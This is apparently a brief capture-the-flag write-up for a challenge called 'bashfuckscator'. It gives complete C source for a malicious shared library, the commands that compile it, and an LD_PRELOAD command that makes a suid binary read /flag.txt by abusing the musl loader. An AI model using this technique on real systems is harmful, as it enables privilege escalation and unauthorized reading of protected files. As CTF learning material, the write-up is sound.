bashfuckscator
==============

Create a file `/dev/tmp/a.c` with the following content:
```C
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); system("cat /flag.txt");  }
```

And compile it:
```bash
$ cd /dev/tmp; gcc -c -o a.o a.c
$ cd /dev/tmp; ld -shared -o liba.so a.o
```

Now execute the `get_flag` binary:
```bash
$ LD_PRELOAD=/dev/tmp/liba.so ./get_flag
```

This is possible since the `musl` loader does not clear the environment on `suid`.
